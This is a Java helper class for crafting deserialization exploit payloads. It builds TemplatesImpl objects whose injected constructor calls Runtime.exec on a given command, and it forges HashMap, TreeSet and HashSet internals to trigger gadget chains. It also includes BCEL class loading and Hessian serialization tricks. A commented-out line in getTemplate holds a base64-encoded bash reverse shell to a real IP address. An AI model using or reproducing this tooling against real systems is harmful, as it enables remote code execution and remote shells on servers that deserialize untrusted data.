package com.javasec.utils;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.Serializer;
import com.caucho.hessian.io.SerializerFactory;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;
import sun.misc.Unsafe;
import sun.reflect.ReflectionFactory;

import java.io.*;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;
import java.util.*;

import com.sun.org.apache.bcel.internal.util.ClassLoader;

import javax.xml.transform.Templates;

public class SerializeUtils {
    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }


    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        if(field != null) {
            field.set(obj, value);
        }
    }
    public  static void setFinalFieldValue(final Object obj, final String fieldName, final Object value) throws Exception{
        final Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        Field modifersField = Field.class.getDeclaredField("modifiers");
        modifersField.setAccessible(true);
        modifersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
        if(field != null) {
            field.set(obj, value);
        }
    }
    public static void base64deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
    public static String base64serial(Object o) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }
    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }
    public static Object createWithoutConstructor(String classname) throws Exception {
        return createWithoutConstructor(Class.forName(classname));
    }
    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws Exception {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }
    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws Exception {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
        Object obj=ois.readObject();
        return obj;
    }
    public static void LoadBcel(String code) throws Exception {
        new ClassLoader().loadClass(code).newInstance();
    }
    public static  String makeBcelStr(Class c) throws Exception{
        JavaClass javaClass= Repository.lookupClass(c);
        String code= Utility.encode(javaClass.getBytes(),true);
        code="$$BCEL$$"+code;
        return code;
    }
    public static TreeSet makeTreeSet(Object v1, Object v2) throws Exception {
        TreeMap<Object,Object> m = new TreeMap<>();
        setFieldValue(m, "size", 2);
        setFieldValue(m, "modCount", 2);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object node = nodeCons.newInstance(v1, new Object[0], null);
        Object right = nodeCons.newInstance(v2, new Object[0], node);
        setFieldValue(node, "right", right);
       setFieldValue(m, "root", node);

        TreeSet set = new TreeSet();
        setFieldValue(set, "m", m);
        return set;
    }
    public static Templates getTemplate(String cmd) throws  Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
        //constructor.setBody("Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}\");");
        constructor.setBody("Runtime.getRuntime().exec(\""+cmd+"\");");
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "boogipop");
        setFieldValue(templatesImpl, "_tfactory", null);
        return templatesImpl;
    }
    public static byte[] getFileBytes(String filepath)throws Exception{
        byte[] code= Files.readAllBytes(Paths.get(filepath));
        return code;
    }
    public static Unsafe getUnsafe() throws NoSuchFieldException, IllegalAccessException {
        Field field = Unsafe.class.getDeclaredField("theUnsafe");
        //私有属性可以访问
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get(null);
        return unsafe;
    }
    public static Templates getTemplateByclass(String classpath) throws  Exception{
        byte[] code= Files.readAllBytes(Paths.get(classpath));
        byte[][] codes={code};
        Templates templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", codes);
        setFieldValue(templatesImpl, "_name", "boogipop");
        setFieldValue(templatesImpl, "_tfactory", null);
        return templatesImpl;
    }
    public static HashSet MakeHashSet(Object o) throws Exception{
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,o);
        return hashset;
    }
    public static void OverideJackson() throws Exception{
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.getCtClass("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.writeFile();
        ctClass.toClass();
    }
    public static SignedObject getSignObject(Object o) throws  Exception{
        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject((Serializable) o,privateKey,signingEngine);
        return signedObject;
    }
    public static ByteArrayOutputStream HessianTostringSerial(Object o) throws Exception{
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(baos);
        baos.write(67); //hessian4
        out.getSerializerFactory().setAllowNonSerializable(true);
        out.writeObject(o);
        out.flushBuffer();
        return baos;
    }
    public static Object makeTreeSetWithXString(Object obj) throws Exception {
        Object rdnEntry1 = SerializeUtils.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        SerializeUtils.setFieldValue(rdnEntry1, "type", "ysomap");
        SerializeUtils.setFieldValue(rdnEntry1, "value", new XString("test"));

        Object rdnEntry2 = SerializeUtils.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        SerializeUtils.setFieldValue(rdnEntry2, "type", "ysomap");
        SerializeUtils.setFieldValue(rdnEntry2, "value", obj);

        return SerializeUtils.makeTreeSet(rdnEntry2, rdnEntry1);
    }
    public static void HessianDeserial(ByteArrayOutputStream out) throws Exception{
        ByteArrayInputStream bais = new ByteArrayInputStream(out.toByteArray());
        Hessian2Input input = new Hessian2Input(bais);
        input.readObject();
    }
    public static String HessianSerial(Object o) throws Exception{
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output oos = new Hessian2Output(baos);
        SerializerFactory serializerFactory = oos.getSerializerFactory();
        oos.setSerializerFactory(serializerFactory);
        serializerFactory.setAllowNonSerializable(true);
        oos.writeObject(o);
        oos.close();
        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;
    }
    public static void HessianDeserial(String base64) throws Exception{
        byte[] base64decodedBytes = Base64.getDecoder().decode(base64);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        Hessian2Input ois = new Hessian2Input(bais);
        ois.readObject();
        ois.close();
    }
    public static Constructor<?> getFirstCtor(final String name) throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        return ctor;
    }
    public static Constructor<?> getConstructor(String classname, Class<?>[] paramTypes) throws ClassNotFoundException, NoSuchMethodException {
        Constructor<?> ctor = Class.forName(classname).getDeclaredConstructor(paramTypes);
        ctor.setAccessible(true);
        return ctor;
    }

    public static Object newInstance(String className, Object ... args) throws Exception {
        return getFirstCtor(className).newInstance(args);
    }

    public static Object newInstance(String classname, Class<?>[] paramTypes, Object... args) throws NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, InvocationTargetException {
        return getConstructor(classname, paramTypes).newInstance(args);
    }

    public static <T> T newInstance(Class<T> cls, Class<?>[] paramTypes, Object... args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        Constructor<?> ctor = cls.getDeclaredConstructor(paramTypes);
        ctor.setAccessible(true);
        return (T) ctor.newInstance(args);
    }
    //创建代理,面向单个接口
    public static <T> T createProxy (final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(java.lang.ClassLoader.getSystemClassLoader(), allIfaces, ih));
    }
    public static void deserTester(Object o) throws Exception {
        base64deserial(base64serial(o));
    }
}
